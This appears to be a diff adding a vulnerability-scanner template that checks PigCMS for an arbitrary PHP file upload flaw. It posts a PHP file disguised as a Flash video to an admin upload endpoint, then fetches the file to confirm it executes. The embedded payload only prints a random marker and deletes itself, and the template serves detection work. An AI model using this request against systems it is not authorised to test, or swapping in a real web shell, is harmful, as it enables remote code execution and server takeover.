@@ -1,0 +1,54 @@
+id: pigcms-file-upload-vuln
+
+info:
+  name: PigCMS File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a file upload vulnerability in PigCMS that allows arbitrary PHP file upload and execution.
+
+variables:
+  r1: "{{rand_text_alpha(20)}}"
+  r2: "{{rand_text_alpha(20)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+
+http:
+  - id: upload
+    method: POST
+    path:
+      - "{{BaseURL}}/cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |-
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="filePath"; filename="{{r1}}.php"
+      Content-Type: video/x-flv
+
+      <?php echo "{{r2}}";unlink(__FILE__);?>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "MAIN_URL_ROOT/(?P<filename>[a-zA-Z0-9_]+).php"
+    extractors:
+      - type: regex
+        part: body
+        name: uploadfilename
+        regex:
+          - "MAIN_URL_ROOT/(?P<filename>[a-zA-Z0-9_]+).php"
+        group: 1
+
+  - id: verify
+    method: GET
+    path:
+      - "{{BaseURL}}/cms/{{uploadfilename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{r2}}"
